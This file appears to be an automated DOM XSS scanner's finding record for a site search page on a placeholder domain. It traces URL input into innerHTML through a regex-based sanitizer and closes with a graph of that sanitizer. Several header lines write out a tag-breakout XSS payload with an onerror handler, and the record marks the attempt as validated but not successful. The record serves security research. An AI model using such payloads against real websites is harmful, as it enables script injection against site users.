// Finding: 5851f1d3-fe03-4954-bbbd-38515bca30e7
// Finding.url: https://example211.com/pages/search-results?q=a</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('70ee634f67c84e82bbdc5186f6ab317d')><!--/*
// Finding.parentloc: https://example211.com/pages/search-results?q=a</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('70ee634f67c84e82bbdc5186f6ab317d')><!--/*
// Finding.domain: example211.com
// Finding.base_domain: example211.com
// Finding.source: location.search
// Finding.sink: innerHTML
// Sanitizer.score: 8
// Sanitizer.name: klevu_getSearchResults
// Sanitizer.location: https://js.example212.com/klevu-js-v1/js-1-1/klevu-landing.js - klevu_getSearchResults:1:64210
// Finding.begin: 0
// Finding.end: 7
// Finding.original_uuid: e2124007-0778-46dd-aacc-8764e46d335a
// Finding.TwentyFiveMillionFlowsId: -1331758489
// Finding.script: https://js.example212.com/klevu-js-v1/js/klevu-webstore.js
// Finding.line: 1
// Exploit.uuid: 70ee634f-67c8-4e82-bbdc-5186f6ab317d
// Exploit.success: false
// Exploit.status: validated
// Exploit.method: C
// Exploit.type: html
// Exploit.token: text
// Exploit.content: a
// Exploit.quote_type: None
// Exploit.tag: None
// Exploit.break_out: a</iframe></style></script></object></embed></textarea><img src=x onerror=
// Exploit.break_in: ><!--/*
// Exploit.payload: a</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
// Exploit.begin_taint_url: 45
// Exploit.end_taint_url: 60
// Exploit.replace_begin_url: 45
// Exploit.replace_end_url: 60
// Exploit.replace_begin_param: 0
// Exploit.replace_end_param: 15
// Issues.LargestEncodeAttrStringChain: 0
// Issues.LargestTextFragmentEncodeChainLength: 0
// Issues.HasApproximation: false
// Issues.HasMissingImplementation: false
// Issues.HasInfiniteRegexWithFunctionReplacer: false
// Issues.MergedSplitAndJoins: false
// Issues.HasUrlInRhsOfReplace: false
// Issues.HasUrlInLhsOfReplace: false
// Issues.HasCookieValueInLhsOfreplace: false
// Issues.HasCookieValueInRhsOfreplace: false
// Issues.HasCookieValueInMatchPattern: false
// Issues.HasCookieValueInExecPattern: false
// Issues.RemovedLRConcats: true
// Issues.RemovedReplaceArtifacts: false
// Issues.HasUrlInMatchPattern: false
// Issues.HasUrlInExecPattern: false
// Issues.RemovedNOPreplaces: false
// Issues.Known_sanitizer: false
// DepGraph.hash: -1744901320
// DepGraph.sanitizer_hash: -859912781
// Removed LR concats 
digraph cfg {
n0 [shape=house, label="Input: x"];
n1 [shape=ellipse, label="regex_exec"];
n2 [shape=box, label="RegExp: /[?&]q=([^&]*)/"];
n3 [shape=box, label="Lit: 1"];
n4 [shape=box, label="Var: x"];
n5 [shape=ellipse, label="preg_replace"];
n6 [shape=box, label="RegExp: /\+/"];
n7 [shape=box, label="Lit:  "];
n8 [shape=box, label="Var: x"];
n9 [shape=ellipse, label="decodeURIComponent"];
n10 [shape=box, label="Var: x"];
n11 [shape=ellipse, label="preg_replace"];
n12 [shape=box, label="RegExp: /(<([^>]+)>)/"];
n13 [shape=box, label="Lit: "];
n14 [shape=box, label="Var: x"];
n15 [shape=ellipse, label="str_replace_once"];
n16 [shape=box, label="RegExp: /^[	\n\r   ᠎             　\u2028\u2029﻿][	\n\r   ᠎             　\u2028\u2029﻿]*/"];
n17 [shape=box, label="Lit: "];
n18 [shape=box, label="Var: x"];
n19 [shape=ellipse, label="str_replace_once"];
n20 [shape=box, label="RegExp: /[	\n\r   ᠎             　\u2028\u2029﻿][	\n\r   ᠎             　\u2028\u2029﻿]*$/"];
n21 [shape=box, label="Lit: "];
n22 [shape=box, label="Var: x"];
n23 [shape=ellipse, label="preg_replace"];
n24 [shape=box, label="RegExp: /%20/"];
n25 [shape=box, label="Lit:  "];
n26 [shape=box, label="Var: x"];
n27 [shape=ellipse, label="preg_replace"];
n28 [shape=box, label="RegExp: /(<([^>]+)>)/"];
n29 [shape=box, label="Lit: "];
n30 [shape=box, label="Var: x"];
n31 [shape=box, label="Var: x"];
n32 [shape=doubleoctagon, label="Return: x"];
n4 -> n0;
n1 -> n2;
n1 -> n3;
n1 -> n4;
n8 -> n1;
n5 -> n6;
n5 -> n7;
n5 -> n8;
n10 -> n5;
n9 -> n10;
n14 -> n9;
n11 -> n12;
n11 -> n13;
n11 -> n14;
n18 -> n11;
n15 -> n16;
n15 -> n17;
n15 -> n18;
n22 -> n15;
n19 -> n20;
n19 -> n21;
n19 -> n22;
n26 -> n19;
n23 -> n24;
n23 -> n25;
n23 -> n26;
n30 -> n23;
n27 -> n28;
n27 -> n29;
n27 -> n30;
n31 -> n27;
n32 -> n31;
}